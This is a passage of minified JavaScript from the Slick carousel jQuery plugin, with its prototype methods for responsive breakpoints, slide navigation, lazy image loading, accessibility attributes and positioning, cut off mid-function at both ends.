                            var d = t * r + (e * a.options.slidesPerRow + i);
                            o.get(d) && c.appendChild(o.get(d))
                        }
                        l.appendChild(c)
                    }
                    s.appendChild(l)
                }
                a.$slider.empty().append(s), a.$slider.children().children().children().css({
                    width: 100 / a.options.slidesPerRow + "%",
                    display: "inline-block"
                })
            }
        }, e.prototype.checkResponsive = function(e, i) {
            var s, n, o, r = this,
                a = !1,
                l = r.$slider.width(),
                c = window.innerWidth || t(window).width();
            if ("window" === r.respondTo ? o = c : "slider" === r.respondTo ? o = l : "min" === r.respondTo && (o = Math.min(c, l)), r.options.responsive && r.options.responsive.length && null !== r.options.responsive) {
                for (s in n = null, r.breakpoints) r.breakpoints.hasOwnProperty(s) && (!1 === r.originalSettings.mobileFirst ? o < r.breakpoints[s] && (n = r.breakpoints[s]) : o > r.breakpoints[s] && (n = r.breakpoints[s]));
                null !== n ? null !== r.activeBreakpoint ? (n !== r.activeBreakpoint || i) && (r.activeBreakpoint = n, "unslick" === r.breakpointSettings[n] ? r.unslick(n) : (r.options = t.extend({}, r.originalSettings, r.breakpointSettings[n]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = n) : (r.activeBreakpoint = n, "unslick" === r.breakpointSettings[n] ? r.unslick(n) : (r.options = t.extend({}, r.originalSettings, r.breakpointSettings[n]), !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e)), a = n) : null !== r.activeBreakpoint && (r.activeBreakpoint = null, r.options = r.originalSettings, !0 === e && (r.currentSlide = r.options.initialSlide), r.refresh(e), a = n), e || !1 === a || r.$slider.trigger("breakpoint", [r, a])
            }
        }, e.prototype.changeSlide = function(e, i) {
            var s, n, o = this,
                r = t(e.currentTarget);
            switch (r.is("a") && e.preventDefault(), r.is("li") || (r = r.closest("li")), s = o.slideCount % o.options.slidesToScroll != 0 ? 0 : (o.slideCount - o.currentSlide) % o.options.slidesToScroll, e.data.message) {
                case "previous":
                    n = 0 === s ? o.options.slidesToScroll : o.options.slidesToShow - s, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide - n, !1, i);
                    break;
                case "next":
                    n = 0 === s ? o.options.slidesToScroll : s, o.slideCount > o.options.slidesToShow && o.slideHandler(o.currentSlide + n, !1, i);
                    break;
                case "index":
                    var a = 0 === e.data.index ? 0 : e.data.index || r.index() * o.options.slidesToScroll;
                    o.slideHandler(o.checkNavigable(a), !1, i), r.children().trigger("focus");
                    break;
                default:
                    return
            }
        }, e.prototype.checkNavigable = function(t) {
            var e, i;
            if (i = 0, t > (e = this.getNavigableIndexes())[e.length - 1]) t = e[e.length - 1];
            else
                for (var s in e) {
                    if (t < e[s]) {
                        t = i;
                        break
                    }
                    i = e[s]
                }
            return t
        }, e.prototype.cleanUpEvents = function() {
            var e = this;
            e.options.dots && null !== e.$dots && t("li", e.$dots).off("click.slick", e.changeSlide).off("mouseenter.slick", t.proxy(e.interrupt, e, !0)).off("mouseleave.slick", t.proxy(e.interrupt, e, !1)), e.$slider.off("focus.slick blur.slick"), !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide), e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide)), e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler), e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler), e.$list.off("touchend.slick mouseup.slick", e.swipeHandler), e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler), e.$list.off("click.slick", e.clickHandler), t(document).off(e.visibilityChange, e.visibility), e.cleanUpSlideEvents(), !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().off("click.slick", e.selectHandler), t(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange), t(window).off("resize.slick.slick-" + e.instanceUid, e.resize), t("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault), t(window).off("load.slick.slick-" + e.instanceUid, e.setPosition), t(document).off("ready.slick.slick-" + e.instanceUid, e.setPosition)
        }, e.prototype.cleanUpSlideEvents = function() {
            var e = this;
            e.$list.off("mouseenter.slick", t.proxy(e.interrupt, e, !0)), e.$list.off("mouseleave.slick", t.proxy(e.interrupt, e, !1))
        }, e.prototype.cleanUpRows = function() {
            var t, e = this;
            e.options.rows > 1 && ((t = e.$slides.children().children()).removeAttr("style"), e.$slider.empty().append(t))
        }, e.prototype.clickHandler = function(t) {
            !1 === this.shouldClick && (t.stopImmediatePropagation(), t.stopPropagation(), t.preventDefault())
        }, e.prototype.destroy = function(e) {
            var i = this;
            i.autoPlayClear(), i.touchObject = {}, i.cleanUpEvents(), t(".slick-cloned", i.$slider).detach(), i.$dots && i.$dots.remove(), i.$prevArrow && i.$prevArrow.length && (i.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.prevArrow) && i.$prevArrow.remove()), i.$nextArrow && i.$nextArrow.length && (i.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), i.htmlExpr.test(i.options.nextArrow) && i.$nextArrow.remove()), i.$slides && (i.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each((function() {
                t(this).attr("style", t(this).data("originalStyling"))
            })), i.$slideTrack.children(this.options.slide).detach(), i.$slideTrack.detach(), i.$list.detach(), i.$slider.append(i.$slides)), i.cleanUpRows(), i.$slider.removeClass("slick-slider"), i.$slider.removeClass("slick-initialized"), i.$slider.removeClass("slick-dotted"), i.unslicked = !0, e || i.$slider.trigger("destroy", [i])
        }, e.prototype.disableTransition = function(t) {
            var e = this,
                i = {};
            i[e.transitionType] = "", !1 === e.options.fade ? e.$slideTrack.css(i) : e.$slides.eq(t).css(i)
        }, e.prototype.fadeSlide = function(t, e) {
            var i = this;
            !1 === i.cssTransitions ? (i.$slides.eq(t).css({
                zIndex: i.options.zIndex
            }), i.$slides.eq(t).animate({
                opacity: 1
            }, i.options.speed, i.options.easing, e)) : (i.applyTransition(t), i.$slides.eq(t).css({
                opacity: 1,
                zIndex: i.options.zIndex
            }), e && setTimeout((function() {
                i.disableTransition(t), e.call()
            }), i.options.speed))
        }, e.prototype.fadeSlideOut = function(t) {
            var e = this;
            !1 === e.cssTransitions ? e.$slides.eq(t).animate({
                opacity: 0,
                zIndex: e.options.zIndex - 2
            }, e.options.speed, e.options.easing) : (e.applyTransition(t), e.$slides.eq(t).css({
                opacity: 0,
                zIndex: e.options.zIndex - 2
            }))
        }, e.prototype.filterSlides = e.prototype.slickFilter = function(t) {
            var e = this;
            null !== t && (e.$slidesCache = e.$slides, e.unload(), e.$slideTrack.children(this.options.slide).detach(), e.$slidesCache.filter(t).appendTo(e.$slideTrack), e.reinit())
        }, e.prototype.focusHandler = function() {
            var e = this;
            e.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*:not(.slick-arrow)", (function(i) {
                i.stopImmediatePropagation();
                var s = t(this);
                setTimeout((function() {
                    e.options.pauseOnFocus && (e.focussed = s.is(":focus"), e.autoPlay())
                }), 0)
            }))
        }, e.prototype.getCurrent = e.prototype.slickCurrentSlide = function() {
            return this.currentSlide
        }, e.prototype.getDotCount = function() {
            var t = this,
                e = 0,
                i = 0,
                s = 0;
            if (!0 === t.options.infinite)
                for (; e < t.slideCount;) ++s, e = i + t.options.slidesToScroll, i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
            else if (!0 === t.options.centerMode) s = t.slideCount;
            else if (t.options.asNavFor)
                for (; e < t.slideCount;) ++s, e = i + t.options.slidesToScroll, i += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
            else s = 1 + Math.ceil((t.slideCount - t.options.slidesToShow) / t.options.slidesToScroll);
            return s - 1
        }, e.prototype.getLeft = function(t) {
            var e, i, s, n = this,
                o = 0;
            return n.slideOffset = 0, i = n.$slides.first().outerHeight(!0), !0 === n.options.infinite ? (n.slideCount > n.options.slidesToShow && (n.slideOffset = n.slideWidth * n.options.slidesToShow * -1, o = i * n.options.slidesToShow * -1), n.slideCount % n.options.slidesToScroll != 0 && t + n.options.slidesToScroll > n.slideCount && n.slideCount > n.options.slidesToShow && (t > n.slideCount ? (n.slideOffset = (n.options.slidesToShow - (t - n.slideCount)) * n.slideWidth * -1, o = (n.options.slidesToShow - (t - n.slideCount)) * i * -1) : (n.slideOffset = n.slideCount % n.options.slidesToScroll * n.slideWidth * -1, o = n.slideCount % n.options.slidesToScroll * i * -1))) : t + n.options.slidesToShow > n.slideCount && (n.slideOffset = (t + n.options.slidesToShow - n.slideCount) * n.slideWidth, o = (t + n.options.slidesToShow - n.slideCount) * i), n.slideCount <= n.options.slidesToShow && (n.slideOffset = 0, o = 0), !0 === n.options.centerMode && !0 === n.options.infinite ? n.slideOffset += n.slideWidth * Math.floor(n.options.slidesToShow / 2) - n.slideWidth : !0 === n.options.centerMode && (n.slideOffset = 0, n.slideOffset += n.slideWidth * Math.floor(n.options.slidesToShow / 2)), e = !1 === n.options.vertical ? t * n.slideWidth * -1 + n.slideOffset : t * i * -1 + o, !0 === n.options.variableWidth && (s = n.slideCount <= n.options.slidesToShow || !1 === n.options.infinite ? n.$slideTrack.children(".slick-slide").eq(t) : n.$slideTrack.children(".slick-slide").eq(t + n.options.slidesToShow), e = !0 === n.options.rtl ? s[0] ? -1 * (n.$slideTrack.width() - s[0].offsetLeft - s.width()) : 0 : s[0] ? -1 * s[0].offsetLeft : 0, !0 === n.options.centerMode && (s = n.slideCount <= n.options.slidesToShow || !1 === n.options.infinite ? n.$slideTrack.children(".slick-slide").eq(t) : n.$slideTrack.children(".slick-slide").eq(t + n.options.slidesToShow + 1), e = !0 === n.options.rtl ? s[0] ? -1 * (n.$slideTrack.width() - s[0].offsetLeft - s.width()) : 0 : s[0] ? -1 * s[0].offsetLeft : 0, e += (n.$list.width() - s.outerWidth()) / 2)), e
        }, e.prototype.getOption = e.prototype.slickGetOption = function(t) {
            return this.options[t]
        }, e.prototype.getNavigableIndexes = function() {
            var t, e = this,
                i = 0,
                s = 0,
                n = [];
            for (!1 === e.options.infinite ? t = e.slideCount : (i = -1 * e.options.slidesToScroll, s = -1 * e.options.slidesToScroll, t = 2 * e.slideCount); t > i;) n.push(i), i = s + e.options.slidesToScroll, s += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
            return n
        }, e.prototype.getSlick = function() {
            return this
        }, e.prototype.getSlideCount = function() {
            var e, i, s = this;
            return i = !0 === s.options.centerMode ? s.slideWidth * Math.floor(s.options.slidesToShow / 2) : 0, !0 === s.options.swipeToSlide ? (s.$slideTrack.find(".slick-slide").each((function(n, o) {
                return o.offsetLeft - i + t(o).outerWidth() / 2 > -1 * s.swipeLeft ? (e = o, !1) : void 0
            })), Math.abs(t(e).attr("data-slick-index") - s.currentSlide) || 1) : s.options.slidesToScroll
        }, e.prototype.goTo = e.prototype.slickGoTo = function(t, e) {
            this.changeSlide({
                data: {
                    message: "index",
                    index: parseInt(t)
                }
            }, e)
        }, e.prototype.init = function(e) {
            var i = this;
            t(i.$slider).hasClass("slick-initialized") || (t(i.$slider).addClass("slick-initialized"), i.buildRows(), i.buildOut(), i.setProps(), i.startLoad(), i.loadSlider(), i.initializeEvents(), i.updateArrows(), i.updateDots(), i.checkResponsive(!0), i.focusHandler()), e && i.$slider.trigger("init", [i]), !0 === i.options.accessibility && i.initADA(), i.options.autoplay && (i.paused = !1, i.autoPlay())
        }, e.prototype.initADA = function() {
            var e = this;
            e.$slides.add(e.$slideTrack.find(".slick-cloned")).attr({
                "aria-hidden": "true",
                tabindex: "-1"
            }).find("a, input, button, select").attr({
                tabindex: "-1"
            }), e.$slideTrack.attr("role", "listbox"), e.$slides.not(e.$slideTrack.find(".slick-cloned")).each((function(i) {
                t(this).attr({
                    role: "option",
                    "aria-describedby": "slick-slide" + e.instanceUid + i
                })
            })), null !== e.$dots && e.$dots.attr("role", "tablist").find("li").each((function(i) {
                t(this).attr({
                    role: "presentation",
                    "aria-selected": "false",
                    "aria-controls": "navigation" + e.instanceUid + i,
                    id: "slick-slide" + e.instanceUid + i
                })
            })).first().attr("aria-selected", "true").end().find("button").attr("role", "button").end().closest("div").attr("role", "toolbar"), e.activateADA()
        }, e.prototype.initArrowEvents = function() {
            var t = this;
            !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.off("click.slick").on("click.slick", {
                message: "previous"
            }, t.changeSlide), t.$nextArrow.off("click.slick").on("click.slick", {
                message: "next"
            }, t.changeSlide))
        }, e.prototype.initDotEvents = function() {
            var e = this;
            !0 === e.options.dots && e.slideCount > e.options.slidesToShow && t("li", e.$dots).on("click.slick", {
                message: "index"
            }, e.changeSlide), !0 === e.options.dots && !0 === e.options.pauseOnDotsHover && t("li", e.$dots).on("mouseenter.slick", t.proxy(e.interrupt, e, !0)).on("mouseleave.slick", t.proxy(e.interrupt, e, !1))
        }, e.prototype.initSlideEvents = function() {
            var e = this;
            e.options.pauseOnHover && (e.$list.on("mouseenter.slick", t.proxy(e.interrupt, e, !0)), e.$list.on("mouseleave.slick", t.proxy(e.interrupt, e, !1)))
        }, e.prototype.initializeEvents = function() {
            var e = this;
            e.initArrowEvents(), e.initDotEvents(), e.initSlideEvents(), e.$list.on("touchstart.slick mousedown.slick", {
                action: "start"
            }, e.swipeHandler), e.$list.on("touchmove.slick mousemove.slick", {
                action: "move"
            }, e.swipeHandler), e.$list.on("touchend.slick mouseup.slick", {
                action: "end"
            }, e.swipeHandler), e.$list.on("touchcancel.slick mouseleave.slick", {
                action: "end"
            }, e.swipeHandler), e.$list.on("click.slick", e.clickHandler), t(document).on(e.visibilityChange, t.proxy(e.visibility, e)), !0 === e.options.accessibility && e.$list.on("keydown.slick", e.keyHandler), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler), t(window).on("orientationchange.slick.slick-" + e.instanceUid, t.proxy(e.orientationChange, e)), t(window).on("resize.slick.slick-" + e.instanceUid, t.proxy(e.resize, e)), t("[draggable!=true]", e.$slideTrack).on("dragstart", e.preventDefault), t(window).on("load.slick.slick-" + e.instanceUid, e.setPosition), t(document).on("ready.slick.slick-" + e.instanceUid, e.setPosition)
        }, e.prototype.initUI = function() {
            var t = this;
            !0 === t.options.arrows && t.slideCount > t.options.slidesToShow && (t.$prevArrow.show(), t.$nextArrow.show()), !0 === t.options.dots && t.slideCount > t.options.slidesToShow && t.$dots.show()
        }, e.prototype.keyHandler = function(t) {
            var e = this;
            t.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === t.keyCode && !0 === e.options.accessibility ? e.changeSlide({
                data: {
                    message: !0 === e.options.rtl ? "next" : "previous"
                }
            }) : 39 === t.keyCode && !0 === e.options.accessibility && e.changeSlide({
                data: {
                    message: !0 === e.options.rtl ? "previous" : "next"
                }
            }))
        }, e.prototype.lazyLoad = function() {
            function e(e) {
                t("img[data-lazy]", e).each((function() {
                    var e = t(this),
                        i = t(this).attr("data-lazy"),
                        s = document.createElement("img");
                    s.onload = function() {
                        e.animate({
                            opacity: 0
                        }, 100, (function() {
                            e.attr("src", i).animate({
                                opacity: 1
                            }, 200, (function() {
                                e.removeAttr("data-lazy").removeClass("slick-loading")
                            })), n.$slider.trigger("lazyLoaded", [n, e, i])
                        }))
                    }, s.onerror = function() {
                        e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), n.$slider.trigger("lazyLoadError", [n, e, i])
                    }, s.src = i
                }))
            }
            var i, s, n = this;
            !0 === n.options.centerMode ? !0 === n.options.infinite ? s = (i = n.currentSlide + (n.options.slidesToShow / 2 + 1)) + n.options.slidesToShow + 2 : (i = Math.max(0, n.currentSlide - (n.options.slidesToShow / 2 + 1)), s = n.options.slidesToShow / 2 + 1 + 2 + n.currentSlide) : (i = n.options.infinite ? n.options.slidesToShow + n.currentSlide : n.currentSlide, s = Math.ceil(i + n.options.slidesToShow), !0 === n.options.fade && (i > 0 && i--, s <= n.slideCount && s++)), e(n.$slider.find(".slick-slide").slice(i, s)), n.slideCount <= n.options.slidesToShow ? e(n.$slider.find(".slick-slide")) : n.currentSlide >= n.slideCount - n.options.slidesToShow ? e(n.$slider.find(".slick-cloned").slice(0, n.options.slidesToShow)) : 0 === n.currentSlide && e(n.$slider.find(".slick-cloned").slice(-1 * n.options.slidesToShow))
        }, e.prototype.loadSlider = function() {
            var t = this;
            t.setPosition(), t.$slideTrack.css({
                opacity: 1
            }), t.$slider.removeClass("slick-loading"), t.initUI(), "progressive" === t.options.lazyLoad && t.progressiveLazyLoad()
        }, e.prototype.next = e.prototype.slickNext = function() {
            this.changeSlide({
                data: {
                    message: "next"
                }
            })
        }, e.prototype.orientationChange = function() {
            this.checkResponsive(), this.setPosition()
        }, e.prototype.pause = e.prototype.slickPause = function() {
            this.autoPlayClear(), this.paused = !0
        }, e.prototype.play = e.prototype.slickPlay = function() {
            var t = this;
            t.autoPlay(), t.options.autoplay = !0, t.paused = !1, t.focussed = !1, t.interrupted = !1
        }, e.prototype.postSlide = function(t) {
            var e = this;
            e.unslicked || (e.$slider.trigger("afterChange", [e, t]), e.animating = !1, e.setPosition(), e.swipeLeft = null, e.options.autoplay && e.autoPlay(), !0 === e.options.accessibility && e.initADA())
        }, e.prototype.prev = e.prototype.slickPrev = function() {
            this.changeSlide({
                data: {
                    message: "previous"
                }
            })
        }, e.prototype.preventDefault = function(t) {
            t.preventDefault()
        }, e.prototype.progressiveLazyLoad = function(e) {
            e = e || 1;
            var i, s, n, o = this,
                r = t("img[data-lazy]", o.$slider);
            r.length ? (i = r.first(), s = i.attr("data-lazy"), (n = document.createElement("img")).onload = function() {
                i.attr("src", s).removeAttr("data-lazy").removeClass("slick-loading"), !0 === o.options.adaptiveHeight && o.setPosition(), o.$slider.trigger("lazyLoaded", [o, i, s]), o.progressiveLazyLoad()
            }, n.onerror = function() {
                3 > e ? setTimeout((function() {
                    o.progressiveLazyLoad(e + 1)
                }), 500) : (i.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), o.$slider.trigger("lazyLoadError", [o, i, s]), o.progressiveLazyLoad())
            }, n.src = s) : o.$slider.trigger("allImagesLoaded", [o])
        }, e.prototype.refresh = function(e) {
            var i, s, n = this;
            s = n.slideCount - n.options.slidesToShow, !n.options.infinite && n.currentSlide > s && (n.currentSlide = s), n.slideCount <= n.options.slidesToShow && (n.currentSlide = 0), i = n.currentSlide, n.destroy(!0), t.extend(n, n.initials, {
                currentSlide: i
            }), n.init(), e || n.changeSlide({
                data: {
                    message: "index",
                    index: i
                }
            }, !1)
        }, e.prototype.registerBreakpoints = function() {
            var e, i, s, n = this,
                o = n.options.responsive || null;
            if ("array" === t.type(o) && o.length) {
                for (e in n.respondTo = n.options.respondTo || "window", o)
                    if (s = n.breakpoints.length - 1, i = o[e].breakpoint, o.hasOwnProperty(e)) {
                        for (; s >= 0;) n.breakpoints[s] && n.breakpoints[s] === i && n.breakpoints.splice(s, 1), s--;
                        n.breakpoints.push(i), n.breakpointSettings[i] = o[e].settings
                    } n.breakpoints.sort((function(t, e) {
                    return n.options.mobileFirst ? t - e : e - t
                }))
            }
        }, e.prototype.reinit = function() {
            var e = this;
            e.$slides = e.$slideTrack.children(e.options.slide).addClass("slick-slide"), e.slideCount = e.$slides.length, e.currentSlide >= e.slideCount && 0 !== e.currentSlide && (e.currentSlide = e.currentSlide - e.options.slidesToScroll), e.slideCount <= e.options.slidesToShow && (e.currentSlide = 0), e.registerBreakpoints(), e.setProps(), e.setupInfinite(), e.buildArrows(), e.updateArrows(), e.initArrowEvents(), e.buildDots(), e.updateDots(), e.initDotEvents(), e.cleanUpSlideEvents(), e.initSlideEvents(), e.checkResponsive(!1, !0), !0 === e.options.focusOnSelect && t(e.$slideTrack).children().on("click.slick", e.selectHandler), e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0), e.setPosition(), e.focusHandler(), e.paused = !e.options.autoplay, e.autoPlay(), e.$slider.trigger("reInit", [e])
        }, e.prototype.resize = function() {
            var e = this;
            t(window).width() !== e.windowWidth && (clearTimeout(e.windowDelay), e.windowDelay = window.setTimeout((function() {
                e.windowWidth = t(window).width(), e.checkResponsive(), e.unslicked || e.setPosition()
            }), 50))
        }, e.prototype.removeSlide = e.prototype.slickRemove = function(t, e, i) {
            var s = this;
            return "boolean" == typeof t ? t = !0 === (e = t) ? 0 : s.slideCount - 1 : t = !0 === e ? --t : t, !(s.slideCount < 1 || 0 > t || t > s.slideCount - 1) && (s.unload(), !0 === i ? s.$slideTrack.children().remove() : s.$slideTrack.children(this.options.slide).eq(t).remove(), s.$slides = s.$slideTrack.children(this.options.slide), s.$slideTrack.children(this.options.slide).detach(), s.$slideTrack.append(s.$slides), s.$slidesCache = s.$slides, void s.reinit())
        }, e.prototype.setCSS = function(t) {
            var e, i, s = this,
                n = {};
            !0 === s.options.rtl && (t = -t), e = "left" == s.positionProp ? Math.ceil(t) + "px" : "0px", i = "top" == s.positionProp ? Math.ceil(t) + "px" : "0px", n[s.positionProp] = t, !1 === s.transformsEnabled ? s.$slideTrack.css(n) : (n = {}, !1 === s.cssTransitions ? (n[s.animType] = "translate(" + e + ", " + i + ")", s.$slideTrack.css(n)) : (n[s.animType] = "translate3d(" + e + ", " + i + ", 0px)", s.$slideTrack.css(n)))
        }, e.prototype.setDimensions = function() {
            var t = this;
            !1 === t.options.vertical ? !0 === t.options.centerMode && t.$list.css({
                padding: "0px " + t.options.centerPadding
            }) : (t.$list.height(t.$slides.first().outerHeight(!0) * t.options.slidesToShow), !0 === t.options.centerMode && t.$list.css({
                padding: t.options.centerPadding + " 0px"
            })), t.listWidth = t.$list.width(), t.listHeight = t.$list.height(), !1 === t.options.vertical && !1 === t.options.variableWidth ? (t.slideWidth = Math.ceil(t.listWidth / t.options.slidesToShow), t.$slideTrack.width(Math.ceil(t.slideWidth * t.$slideTrack.children(".slick-slide").length))) : !0 === t.options.variableWidth ? t.$slideTrack.width(5e3 * t.slideCount) : (t.slideWidth = Math.ceil(t.listWidth), t.$slideTrack.height(Math.ceil(t.$slides.first().outerHeight(!0) * t.$slideTrack.children(".slick-slide").length)));
            var e = t.$slides.first().outerWidth(!0) - t.$slides.first().width();
            !1 === t.options.variableWidth && t.$slideTrack.children(".slick-slide").width(t.slideWidth - e)
        }, e.prototype.setFade = function() {
            var e, i = this;
            i.$slides.each((function(s, n) {
                e = i.slideWidth * s * -1, !0 === i.options.rtl ? t(n).css({
                    position: "relative",
                    right: e,
                    top: 0,
                    zIndex: i.options.zIndex - 2,
                    opacity: 0
                }) : t(n).css({
                    position: "relative",
                    left: e,
                    top: 0,
                    zIndex: i.options.zIndex - 2,
                    opacity: 0
                })
            })), i.$slides.eq(i.currentSlide).css({
                zIndex: i.options.zIndex - 1,
                opacity: 1
            })
        }, e.prototype.setHeight = function() {
            var t = this;
            if (1 === t.options.slidesToShow && !0 === t.options.adaptiveHeight && !1 === t.options.vertical) {
                var e = t.$slides.eq(t.currentSlide).outerHeight(!0);
                t.$list.css("height", e)
            }
        }, e.prototype.setOption = e.prototype.slickSetOption = function() {
            var e, i, s, n, o, r = this,
                a = !1;
            if ("object" === t.type(arguments[0]) ? (s = arguments[0], a = arguments[1], o = "multiple") : "string" === t.type(arguments[0]) && (s = arguments[0], n = arguments[1], a = arguments[2], "responsive" === arguments[0] && "array" === t.type(arguments[1]) ? o = "responsive" : void 0 !== arguments[1] && (o = "single")), "single" === o) r.options[s] = n;
            else if ("multiple" === o) t.each(s, (function(t, e) {
                r.options[t] = e
            }));
            else if ("responsive" === o)
                for (i in n)
                    if ("array" !== t.type(r.options.responsive)) r.options.responsive = [n[i]];
                    else {
                        for (e = r.options.responsive.length - 1; e >= 0;) r.options.responsive[e].breakpoint === n[i].breakpoint && r.options.responsive.splice(e, 1), e--;
                        r.options.responsive.push(n[i])
                    } a && (r.unload(), r.reinit())
        }, e.prototype.setPosition = function() {
            var t = this;
            t.setDimensions(), t.setHeight(), !1 === t.options.fade ? t.setCSS(t.getLeft(t.currentSlide)) : t.setFade(), t.$slider.trigger("setPosition", [t])
        }, e.prototype.setProps = function() {
            var t = this,
                e = document.body.style;
            t.positionProp = !0 === t.options.vertical ? "top" : "left", "top" === t.positionProp ? t.$slider.addClass("slick-vertical") : t.$slider.removeClass("slick-vertical"), (void 0 !== e.WebkitTransition || void 0 !== e.MozTransition || void 0 !== e.msTransition) && !0 === t.options.useCSS && (t.cssTransitions = !0), t.options.fade && ("number" == typeof t.options.zIndex ? t.options.zIndex < 3 && (t.options.zIndex = 3) : t.options.zIndex = t.defaults.zIndex), void 0 !== e.OTransform && (t.animType = "OTransform", t.transformType = "-o-transform", t.transitionType = "OTransition", void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)), void 0 !== e.MozTransform && (t.animType = "MozTransform", t.transformType = "-moz-transform", t.transitionType = "MozTransition", void 0 === e.perspectiveProperty && void 0 === e.MozPerspective && (t.animType = !1)), void 0 !== e.webkitTransform && (t.animType = "webkitTransform", t.transformType = "-webkit-transform", t.transitionType = "webkitTransition", void 0 === e.perspectiveProperty && void 0 === e.webkitPerspective && (t.animType = !1)), void 0 !== e.msTransform && (t.animType = "msTransform", t.transformType = "-ms-transform", t.transitionType = "msTransition", void 0 === e.msTransform && (t.animType = !1)), void 0 !== e.transform && !1 !== t.animType && (t.animType = "transform", t.transformType = "transform", t.transitionType = "transition"), t.transformsEnabled = t.options.useTransform && null !== t.animType && !1 !== t.animType
        }, e.prototype.setSlideClasses = function(t) {
            var e, i, s, n, o = this;
            i = o.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), o.$slides.eq(t).addClass("slick-current"), !0 === o.options.centerMode ? (e = Math.floor(o.options.slidesToShow / 2), !0 === o.options.infinite && (t >= e && t <= o.slideCount - 1 - e ? o.$slides.slice(t - e, t + e + 1).addClass("slick-active").attr("aria-hidden", "false") : (s = o.options.slidesToShow + t, i.slice(s - e + 1, s + e + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === t ? i.eq(i.length - 1 - o.options.slidesToShow).addClass("slick-center") : t === o.slideCount - 1 && i.eq(o.options.slidesToShow).addClass("slick-center")), o.$slides.eq(t).addClass("slick-center")) : t >= 0 && t <= o.slideCount - o.options.slidesToShow ? o.$slides.slice(t, t + o.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : i.length <= o.options.slidesToShow ? i.addClass("slick-active").attr("aria-hidden", "false") : (n = o.slideCount % o.options.slidesToShow, s = !0 === o.options.infinite ? o.options.slidesToShow + t : t, o.options.slidesToShow == o.options.slidesToScroll && o.slideCount - t < o.options.slidesToShow ? i.slice(s - (o.options.slidesToShow - n), s + n).addClass("slick-active").attr("aria-hidden", "false") : i.slice(s, s + o.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false")), "ondemand" === o.options.lazyLoad && o.lazyLoad()
        }, e.prototype.setupInfinite = function() {
            var e, i, s, n = this;
            if (!0 === n.options.fade && (n.options.centerMode = !1), !0 === n.options.infinite && !1 === n.options.fade && (i = null, n.slideCount > n.options.slidesToShow)) {
                for (s = !0 === n.options.centerMode ? n.options.slidesToShow + 1 : n.options.slidesToShow, e = n.slideCount; e > n.slideCount - s; e -= 1) i = e - 1, t(n.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i - n.slideCount).prependTo(n.$slideTrack).addClass("slick-cloned");
                for (e = 0; s > e; e += 1) i = e, t(n.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i + n.slideCount).appendTo(n.$slideTrack).addClass("slick-cloned");
                n.$slideTrack.find(".slick-cloned").find("[id]").each((function() {
                    t(this).attr("id", "")
                }))
            }
        }, e.prototype.interrupt = function(t) {
            t || this.autoPlay(), this.interrupted = t
        }, e.prototype.selectHandler = function(e) {
            var i = this,
                s = t(e.target).is(".slick-slide") ? t(e.target) : t(e.target).parents(".slick-slide"),
                n = parseInt(s.attr("data-slick-index"));
            return n || (n = 0), i.slideCount <= i.options.slidesToShow ? (i.setSlideClasses(n), void i.asNavFor(n)) : void i.slideHandler(n)
        }, e.prototype.slideHandler = function(t, e, i) {
            var s, n, o, r, a, l = null,
                c = this;
            return e = e || !1, !0 === c.animating && !0 === c.options.waitForAnimate || !0 === c.options.fade && c.currentSlide === t || c.slideCount <= c.options.slidesToShow ? void 0 : (!1 === e && c.asNavFor(t), s = t, l = c.getLeft(s), r = c.getLeft(c.currentSlide), c.currentLeft = null === c.swipeLeft ? r : c.swipeLeft, !1 === c.options.infinite && !1 === c.options.centerMode && (0 > t || t > c.getDotCount() * c.options.slidesToScroll) || !1 === c.options.infinite && !0 === c.options.centerMode && (0 > t || t > c.slideCount - c.options.slidesToScroll) ? void(!1 === c.options.fade && (s = c.currentSlide, !0 !== i ? c.animateSlide(r, (function() {
                c.postSlide(s)
